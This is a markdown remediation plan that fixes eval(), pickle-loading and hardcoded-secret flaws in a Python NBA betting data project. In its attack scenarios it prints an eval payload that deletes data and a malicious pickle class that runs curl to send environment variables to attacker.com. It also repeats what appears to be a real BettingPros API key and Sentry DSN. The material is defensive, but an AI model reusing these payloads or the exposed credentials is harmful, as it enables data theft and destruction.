# SESSION 1: CRITICAL CODE EXECUTION FIXES
## Remote Code Execution Vulnerabilities - HIGHEST PRIORITY

**Date:** January 19, 2026
**Session:** 1 of 3
**Effort:** 2.5-3 hours
**Status:** 🔴 CRITICAL - FIX IMMEDIATELY
**Next Session:** SESSION-2-HIGH-SEVERITY.md

---

## SESSION OVERVIEW

### What You're Fixing

This session eliminates **Remote Code Execution (RCE) vulnerabilities** - the most severe security issues:

1. **eval() code execution** - Direct arbitrary code execution (30 min)
2. **Pickle deserialization** - Code execution via model files (1-2 hours)
3. **Hardcoded secrets** - Credential exposure (35 min)

###Why This Must Be First

**RCE is worse than SQL injection because:**
- Attackers can execute ANY Python code on your servers
- Full system access (read files, exfiltrate data, install backdoors)
- Persistent (can modify code, add SSH keys)
- No logs/alerts (happens silently)

**SQL injection only gives data access. RCE gives system control.**

---

## ISSUE #8: eval() Code Execution (30 MIN) ⚠️ START HERE

### Location

**File:** `scripts/test_nbac_gamebook_processor.py`
**Lines:** 40-44

### Current Vulnerable Code

```python
try:
    data = json.loads(content)
except json.JSONDecodeError:
    # Try eval for dict-like strings
    data = eval(content)  # 🔴 EXECUTES ANY PYTHON CODE!
```

### Attack Scenario

```python
# Attacker uploads malicious file to GCS:
gs://your-bucket/test-data.json contains:
__import__('os').system('rm -rf /data/*')
# or: exfiltrate credentials, install backdoor, etc.

# When script runs: arbitrary code executes
```

### Secure Replacement

```python
import ast
import json

try:
    data = json.loads(content)
except json.JSONDecodeError:
    try:
        # SAFE: ast.literal_eval() only evaluates Python literals
        # Blocks all function calls, imports, code execution
        data = ast.literal_eval(content)
    except (ValueError, SyntaxError) as e:
        raise ValueError(f"Invalid data format: {e}")
```

### Implementation Checklist (30 minutes)

- [ ] **Step 1: Replace eval() (10 min)**
  - [ ] Open `scripts/test_nbac_gamebook_processor.py`
  - [ ] Add `import ast` at top
  - [ ] Replace `eval(content)` with `ast.literal_eval(content)`
  - [ ] Update exception handling (ValueError, SyntaxError)

- [ ] **Step 2: Search for other eval() usage (10 min)**
  ```bash
  # Find all eval() calls in codebase
  grep -rn "eval(" --include="*.py" . | grep -v ".pyc" | grep -v "__pycache__"

  # Expected: Should only find test cases or comments
  # If you find other instances: FIX THEM TOO
  ```

- [ ] **Step 3: Test the fix (10 min)**
  - [ ] Test: Valid Python dict → Should load successfully
    ```python
    content = "{'key': 'value', 'num': 123}"
    assert ast.literal_eval(content) == {'key': 'value', 'num': 123}
    ```

  - [ ] Test: Code execution attempt → Should raise ValueError
    ```python
    content = "__import__('os').system('echo hacked')"
    try:
        ast.literal_eval(content)
        assert False, "Should have raised exception!"
    except (ValueError, SyntaxError):
        pass  # Expected - code execution blocked
    ```

  - [ ] Test: Valid JSON → Should still use json.loads() fast path
    ```python
    content = '{"key": "value"}'
    assert json.loads(content) == {"key": "value"}
    ```

### Verification

```bash
# After fix, this should return NO results:
grep -rn "^[^#]*eval(" --include="*.py" . | grep -v "literal_eval"

# If you see ANY eval() calls that aren't ast.literal_eval:
# → FIX THEM or DOCUMENT why they're safe
```

**✅ CHECKPOINT: eval() completely removed before moving to Issue #7**

---

## ISSUE #7: Pickle Deserialization (1-2 HOURS)

### Location

**File:** `ml/model_loader.py`
**Lines:** 224-230

### Current Vulnerable Code

```python
def _load_sklearn(path: str) -> Optional[Any]:
    """Load sklearn model from pickle"""
    import pickle
    with open(path, 'rb') as f:
        return pickle.load(f)  # 🔴 NO INTEGRITY CHECK!
```

### Attack Scenario

```python
# Attacker with GCS write access creates malicious model:
import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        # Executes when pickle.load() is called
        return (os.system, ('curl attacker.com/exfil?$(env | base64)',))

with open('model.pkl', 'wb') as f:
    pickle.dump(MaliciousModel(), f)

# Upload to GCS, wait for model to load
# → All environment variables (including credentials) exfiltrated
```

### Secure Replacement

```python
import joblib  # Safer than raw pickle
import hashlib
import os
from typing import Optional, Any

def _load_sklearn(path: str) -> Optional[Any]:
    """
    Load sklearn model with integrity validation.

    Requires: {path}.sha256 file with expected hash
    """
    # Step 1: Load expected hash
    hash_file = f"{path}.sha256"
    if not os.path.exists(hash_file):
        raise ValueError(f"Model hash file missing: {hash_file}")

    with open(hash_file, 'r') as f:
        expected_hash = f.read().strip()

    # Step 2: Compute actual hash
    with open(path, 'rb') as f:
        content = f.read()
        actual_hash = hashlib.sha256(content).hexdigest()

    # Step 3: Verify integrity
    if actual_hash != expected_hash:
        raise ValueError(
            f"Model integrity check FAILED!\n"
            f"Expected: {expected_hash}\n"
            f"Got:      {actual_hash}\n"
            f"Possible tampering detected - refusing to load"
        )

    # Step 4: Load with joblib (safer than pickle)
    return joblib.load(path)
```

### Implementation Checklist (1-2 hours)

- [ ] **Step 1: Create hash generation script (30 min)**

  Create `scripts/generate_model_hashes.py`:
  ```python
  #!/usr/bin/env python3
  """Generate SHA256 hashes for all model files."""

  import hashlib
  import glob
  import os

  def generate_hash(file_path: str) -> str:
      """Generate SHA256 hash of file."""
      sha256 = hashlib.sha256()
      with open(file_path, 'rb') as f:
          while chunk := f.read(8192):
              sha256.update(chunk)
      return sha256.hexdigest()

  def main():
      # Find all model files
      patterns = [
          'ml/models/**/*.pkl',
          'ml/models/**/*.joblib',
          'models/**/*.pkl',
          'models/**/*.joblib',
      ]

      model_files = []
      for pattern in patterns:
          model_files.extend(glob.glob(pattern, recursive=True))

      if not model_files:
          print("❌ No model files found")
          return

      # Generate hashes
      for model_path in model_files:
          hash_value = generate_hash(model_path)
          hash_path = f"{model_path}.sha256"

          with open(hash_path, 'w') as f:
              f.write(hash_value)

          print(f"✅ {model_path}")
          print(f"   Hash: {hash_value[:16]}...")

      print(f"\n✅ Generated {len(model_files)} hash files")

  if __name__ == '__main__':
      main()
  ```

  - [ ] Create the script file
  - [ ] Make it executable: `chmod +x scripts/generate_model_hashes.py`
  - [ ] Test: `python scripts/generate_model_hashes.py`

- [ ] **Step 2: Update model_loader.py (30 min)**

  - [ ] Add imports: `joblib`, `hashlib`, `os`
  - [ ] Replace `_load_sklearn()` function with secure version (see code above)
  - [ ] Update any calls to `_load_sklearn()` if signature changed
  - [ ] Add logging for hash validation:
    ```python
    logger.info(f"Loading model from {path}")
    logger.info(f"Expected hash: {expected_hash[:16]}...")
    logger.info(f"Actual hash:   {actual_hash[:16]}...")
    logger.info("✅ Hash validation passed")
    ```

- [ ] **Step 3: Generate hashes for existing models (15 min)**

  ```bash
  # Run hash generation
  python scripts/generate_model_hashes.py

  # Verify .sha256 files created
  find ml/models -name "*.sha256"

  # Example output:
  # ml/models/player_props/v1.0/model.pkl.sha256
  # ml/models/team_totals/v2.1/model.pkl.sha256
  ```

  - [ ] Commit .sha256 files to git (they're NOT secrets - they're checksums)
  - [ ] Document in README that hash files MUST be updated when models change

- [ ] **Step 4: Test the fix (15 min)**

  - [ ] Test: Valid model + correct hash → Loads successfully
    ```python
    from ml.model_loader import _load_sklearn

    # Should work
    model = _load_sklearn('ml/models/test/model.pkl')
    assert model is not None
    ```

  - [ ] Test: Valid model + WRONG hash → Raises ValueError
    ```python
    # Tamper with hash file
    with open('ml/models/test/model.pkl.sha256', 'w') as f:
        f.write('0' * 64)  # Invalid hash

    # Should raise ValueError
    try:
        model = _load_sklearn('ml/models/test/model.pkl')
        assert False, "Should have raised ValueError!"
    except ValueError as e:
        assert "integrity check FAILED" in str(e)
    ```

  - [ ] Test: Missing hash file → Raises ValueError
    ```python
    import os
    os.remove('ml/models/test/model.pkl.sha256')

    try:
        model = _load_sklearn('ml/models/test/model.pkl')
        assert False, "Should have raised ValueError!"
    except ValueError as e:
        assert "hash file missing" in str(e)
    ```

- [ ] **Step 5: Update deployment process (10 min)**

  Add to deployment documentation:
  ```markdown
  ## Updating ML Models

  When updating models:
  1. Train and save new model: `model.pkl`
  2. Generate hash: `python scripts/generate_model_hashes.py`
  3. Commit BOTH files: `model.pkl` and `model.pkl.sha256`
  4. Deploy

  ⚠️ NEVER deploy model without corresponding .sha256 file!
  ```

### Verification

```bash
# All models should have corresponding .sha256 files:
for model in $(find ml/models -name "*.pkl" -o -name "*.joblib"); do
    hash_file="${model}.sha256"
    if [ ! -f "$hash_file" ]; then
        echo "❌ Missing hash: $hash_file"
    else
        echo "✅ $model"
    fi
done
```

**✅ CHECKPOINT: All models have hash validation before moving to Issue #1**

---

## ISSUE #1: Hardcoded Secrets (35 MIN)

### Secret #1: BettingPros API Key (25 min)

#### Location

**File:** `scrapers/utils/nba_header_utils.py`
**Line:** 154

#### Current Vulnerable Code

```python
BETTINGPROS_HEADERS = {
    'User-Agent': 'Mozilla/5.0...',
    'Accept': 'application/json',
    'X-Api-Key': 'CHi8Hy5CEE4khd46XNYL23dCFX96oUdw6qOt1Dnh',  # 🔴 HARDCODED!
}
```

#### Secure Replacement

```python
import os

BETTINGPROS_HEADERS = {
    'User-Agent': 'Mozilla/5.0...',
    'Accept': 'application/json',
    'X-Api-Key': os.environ.get('BETTINGPROS_API_KEY', ''),
}

# Validation
if not BETTINGPROS_HEADERS['X-Api-Key']:
    import logging
    logging.getLogger(__name__).warning(
        "BETTINGPROS_API_KEY environment variable not set - API calls will fail"
    )
```

#### Implementation (25 min)

- [ ] **Update code (5 min)**
  - [ ] Replace hardcoded key with `os.environ.get('BETTINGPROS_API_KEY', '')`
  - [ ] Add validation warning

- [ ] **Set environment variable (5 min)**
  ```bash
  # For Cloud Run:
  gcloud run services update <service-name> \
    --update-env-vars BETTINGPROS_API_KEY=CHi8Hy5CEE4khd46XNYL23dCFX96oUdw6qOt1Dnh

  # For local development (.env file):
  echo "BETTINGPROS_API_KEY=CHi8Hy5CEE4khd46XNYL23dCFX96oUdw6qOt1Dnh" >> .env
  ```

- [ ] **Update documentation (5 min)**
  - [ ] Add to README: Required environment variables
  - [ ] Update `.env.example`:
    ```bash
    # .env.example
    BETTINGPROS_API_KEY=your_api_key_here
    ```

- [ ] **Search for other secrets (10 min)**
  ```bash
  # Search for API keys
  grep -ri "api.*key.*=.*['\"][a-zA-Z0-9]{20,}" --include="*.py" .

  # Search for tokens
  grep -ri "token.*=.*['\"][a-zA-Z0-9]{20,}" --include="*.py" .

  # Search for passwords
  grep -ri "password.*=.*['\"]" --include="*.py" .

  # If you find ANY hardcoded secrets: FIX THEM
  ```

---

### Secret #2: Sentry DSN (10 min)

#### Location

**File:** `scrapers/scraper_base.py`
**Line:** 24

#### Current Vulnerable Code

```python
sentry_sdk.init(
    dsn="https://96f5d7efbb7105ef2c05aa551fa5f4e0@o102085.ingest.us.sentry.io/4509460047790080",
    # ... other config
)
```

#### Secure Replacement

```python
import os
import sentry_sdk

sentry_dsn = os.environ.get('SENTRY_DSN', '')
if sentry_dsn:
    sentry_sdk.init(
        dsn=sentry_dsn,
        # ... other config
    )
else:
    logger.info("Sentry DSN not configured - error monitoring disabled")
```

#### Implementation (10 min)

- [ ] **Update code (5 min)**
  - [ ] Move DSN to environment variable
  - [ ] Add conditional initialization

- [ ] **Set environment variable (2 min)**
  ```bash
  gcloud run services update <service-name> \
    --update-env-vars SENTRY_DSN=https://96f5d7efbb7105ef2c05aa551fa5f4e0@o102085.ingest.us.sentry.io/4509460047790080
  ```

- [ ] **Test Sentry still works (3 min)**
  - [ ] Trigger an error
  - [ ] Verify it appears in Sentry dashboard

---

## POST-SESSION CHECKLIST

### Before Creating Git Commit

- [ ] **All eval() removed**
  ```bash
  grep -rn "^[^#]*eval(" --include="*.py" . | grep -v "literal_eval"
  # Should return NO results
  ```

- [ ] **All pickles have hash validation**
  ```bash
  # Check model_loader.py has integrity checks
  grep -n "sha256\|hashlib" ml/model_loader.py
  # Should see hash validation code
  ```

- [ ] **No hardcoded secrets**
  ```bash
  # BettingPros key moved to env
  grep -n "CHi8Hy5CEE4khd46XNYL23dCFX96oUdw6qOt1Dnh" scrapers/utils/nba_header_utils.py
  # Should return NO results

  # Sentry DSN moved to env
  grep -n "96f5d7efbb7105ef2c05aa551fa5f4e0" scrapers/scraper_base.py
  # Should return NO results
  ```

- [ ] **All tests pass**
  ```bash
  pytest tests/security/test_code_execution.py
  pytest tests/security/test_model_loading.py
  ```

---

## CREATE GIT COMMIT

```bash
git add \
  scripts/test_nbac_gamebook_processor.py \
  scripts/generate_model_hashes.py \
  ml/model_loader.py \
  ml/models/**/*.sha256 \
  scrapers/utils/nba_header_utils.py \
  scrapers/scraper_base.py \
  .env.example \
  README.md

git commit -m "security(critical): Fix 3 critical RCE vulnerabilities (Session 1)

CRITICAL SECURITY FIXES - Remote Code Execution:

Issue #8: Remove eval() code execution
- Replace eval() with ast.literal_eval() in test_nbac_gamebook_processor.py
- Blocks arbitrary code execution via malicious files
- Severity: CRITICAL (RCE)

Issue #7: Add pickle deserialization protection
- Implement SHA256 hash validation for all model files
- Replace pickle.load() with integrity-checked joblib.load()
- Generated .sha256 files for all existing models
- Severity: CRITICAL (RCE via model files)

Issue #1: Remove hardcoded secrets
- Move BettingPros API key to BETTINGPROS_API_KEY env var
- Move Sentry DSN to SENTRY_DSN env var
- Update documentation with required env vars
- Severity: CRITICAL (credential exposure)

Total effort: 2.5 hours
Security review: Multi-agent analysis (Session 121)

Next: Session 2 (High Severity - Auth + SQL + Fail-Open)
"
```

---

## SESSION COMPLETION

### Success Criteria

✅ **All 3 critical issues fixed:**
- Issue #8: eval() completely removed
- Issue #7: All models have hash validation
- Issue #1: No hardcoded secrets remain

✅ **All tests passing**

✅ **Git commit created**

### Handoff to Session 2

**What's fixed:** Remote Code Execution vulnerabilities eliminated

**Next session:** SESSION-2-HIGH-SEVERITY.md
- Issue #9: Add authentication to /process-date-range
- Issue #3: Fix fail-open error handling (4 locations)
- Issue #2: Fix SQL injection in DELETE queries (3 files)
- Issue #2: Fix SQL injection in original 8 queries

**Estimated effort:** 7-9 hours

---

**Session 1 Complete!** 🎉

**Critical RCE vulnerabilities eliminated. Your servers are now protected from arbitrary code execution attacks.**

Proceed to SESSION-2-HIGH-SEVERITY.md when ready.
